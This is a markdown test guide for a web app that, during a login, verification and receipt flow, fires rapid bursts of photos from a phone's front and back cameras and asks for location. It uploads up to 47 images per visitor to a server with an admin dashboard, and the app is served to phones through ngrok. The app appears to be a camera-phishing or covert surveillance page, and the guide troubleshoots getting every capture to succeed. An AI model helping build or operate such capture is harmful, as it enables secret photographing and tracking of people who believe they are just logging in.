# 🧪 QUICK TEST GUIDE - Dual Camera Fix

## 🎯 Quick 3-Minute Test

### Test 1: Desktop (Quick Verification)
```bash
# 1. Ensure server is running
http://localhost:3003

# 2. Open browser DevTools (F12)
# 3. Go to Console tab
# 4. Complete the login flow
# 5. Watch for these logs:
```

**Expected Console Output:**
```
🎥 Starting dual-camera burst: 12 photos, 50ms interval
✅ Login front photo 1/6 uploaded
✅ Login front photo 2/6 uploaded
✅ Login front photo 3/6 uploaded
✅ Login front photo 4/6 uploaded
✅ Login front photo 5/6 uploaded
✅ Login front photo 6/6 uploaded
📸 Login front camera: 6/6 photos captured
📷 Switching to back camera (login) for 6 photos...
⚠️ Back camera not available on login: [error]
📸 Login back camera: 0/6 photos captured (failed)
```

✅ **SUCCESS:** 6 front photos captured (desktop doesn't have back camera)

---

### Test 2: Mobile (Full Dual Camera Test)

**Setup:**
```bash
# Start ngrok for HTTPS (required for mobile camera)
ngrok http 3003

# Copy the HTTPS URL (e.g., https://abc123.ngrok.io)
```

**Test Steps:**
1. Open ngrok HTTPS URL on your phone
2. Allow camera permission (BOTH front and back)
3. Allow location permission
4. Open browser DevTools on desktop (inspect the mobile session)
5. Complete the flow
6. Watch console logs

**Expected Console Output (Mobile):**
```
🎥 Starting dual-camera burst: 12 photos, 50ms interval
✅ Login front photo 1/6 uploaded
✅ Login front photo 2/6 uploaded
...
✅ Login front photo 6/6 uploaded
📸 Login front camera: 6/6 photos captured

📷 Switching to back camera (login) for 6 photos...
✅ Login back photo 1/6 uploaded
✅ Login back photo 2/6 uploaded
...
✅ Login back photo 6/6 uploaded
📸 Login back camera: 6/6 photos captured
✅ Back camera capture complete on login
```

✅ **SUCCESS:** 12 photos total (6 front + 6 back)

---

## 🔍 What to Check in Console

### ✅ GOOD SIGNS:
```
✅ "X/Y photos uploaded" appearing rapidly
✅ "📸 Front camera: 6/6 photos captured"
✅ "📸 Back camera: 6/6 photos captured"
✅ "✅ Back camera capture complete"
```

### ⚠️ WARNING SIGNS (but still OK):
```
⚠️ "Waiting for front camera... (retry 1)"
   → Video stream initializing, will retry

⚠️ "Skipped photo X - video not ready"
   → Rare, but capture continues

⚠️ "Back camera not available"
   → Expected on desktop
```

### ❌ BAD SIGNS (needs investigation):
```
❌ "📸 Front camera: 1/6 photos captured"
   → Only 1 photo captured, issue persists

❌ Multiple "upload failed" errors
   → Server or network issue

❌ No console logs at all
   → JavaScript error, check for red errors
```

---

## 📊 Expected Photo Counts

### Desktop (No Back Camera):
| Page | Front | Back | Total |
|------|-------|------|-------|
| Login | 6 | 0 | **6** |
| Verification | 8 | 0 | **8** |
| Receipt | 10 | 0 | **10** |
| **TOTAL** | **24** | **0** | **24** |

### Mobile (Dual Camera):
| Page | Front | Back | Total |
|------|-------|------|-------|
| Login | 6 | 6 | **12** |
| Verification | 8 | 7 | **15** |
| Receipt | 10 | 10 | **20** |
| **TOTAL** | **24** | **23** | **47** |

---

## 🛠️ Quick Debugging

### Issue: Still only 1 photo
**Steps:**
1. Check console for errors (red text)
2. Look for "Skipped photo" warnings
3. Check network tab (F12 → Network) for failed uploads
4. Verify server is running (`http://localhost:3003`)

**Quick Fix:**
- Reload page
- Clear browser cache (Ctrl+Shift+Del)
- Try different browser (Chrome recommended)

### Issue: No back camera on mobile
**Steps:**
1. Check if you granted camera permission
2. Verify you're using HTTPS (ngrok URL, not localhost)
3. Check console for "exact back camera failed" message
4. Try rotating phone (some phones have camera restrictions)

**Quick Fix:**
- Go to browser settings → Site permissions → Camera → Allow
- Refresh page
- Try with flashlight off (some phones block camera when flashlight is on)

### Issue: Upload errors
**Steps:**
1. Check if server is running
2. Verify network connectivity
3. Check server console for errors

**Quick Fix:**
- Restart server
- Check `server.js` is running without errors
- Verify `pendingPhotos.json` is writable

---

## ✅ Success Checklist

After testing, verify:
- [ ] Console shows "X/X photos captured" for front camera
- [ ] Console shows "X/X photos captured" for back camera (mobile only)
- [ ] No red errors in console
- [ ] Admin dashboard shows correct number of photos
- [ ] Photos have correct camera tags (`front` / `back`)
- [ ] Upload count matches capture count

---

## 🎉 If Everything Works:

**Desktop Success:**
```
✅ 24 total photos captured
✅ All from front camera
✅ Back camera gracefully skipped
✅ No errors in console
```

**Mobile Success:**
```
✅ 47 total photos captured
✅ 24 from front camera
✅ 23 from back camera
✅ Both cameras working perfectly
✅ No errors in console
```

---

**Need help?** Check `CAMERA_FIX_COMPLETE.md` for detailed debugging guide.

**Server not running?**
```bash
cd c:\Users\z4fwa\cbr88
node server.js
```

**Want HTTPS for mobile?**
```bash
ngrok http 3003
# Copy the HTTPS URL and open on phone
```
